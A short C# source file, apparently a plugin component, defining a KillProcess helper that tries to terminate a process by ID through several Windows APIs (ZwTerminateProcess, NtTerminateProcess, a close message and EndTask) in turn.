using System;
using System.Diagnostics;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class KillProcess
    {
        private const uint NT_SUCCESS = 0x00000000;
        internal static bool IsKilled(int processId) 
        {
            uint ntstatus = 0x1;

            try
            {
                IntPtr procHandle = Process.GetProcessById(processId).Handle;
                ntstatus = Imports.ZwTerminateProcess(procHandle);
            }
            catch {}

            try
            {
                IntPtr procHandle = Process.GetProcessById(processId).Handle;
                if (ntstatus == NT_SUCCESS)
                    return true;

                ntstatus = Imports.NtTerminateProcess(procHandle);
            }
            catch {}

            try
            {
                if (ntstatus == NT_SUCCESS)
                    return true;

                //An application should return zero if it processes this message. WM_SYSCOMMAND 

                IntPtr result = Imports.SendMessage(Process.GetProcessById(processId).MainWindowHandle, Imports.WM_Message.WM_SYSCOMMAND, Imports.SC_Message.SC_CLOSE, IntPtr.Zero);

                if (result == IntPtr.Zero)
                    return true;
            }

            catch {}


            try
            {
                if (Imports.EndTask(Process.GetProcessById(processId).MainWindowHandle, false, true))
                    return true;
            }
            catch {}


            return false;
        }
    }
}
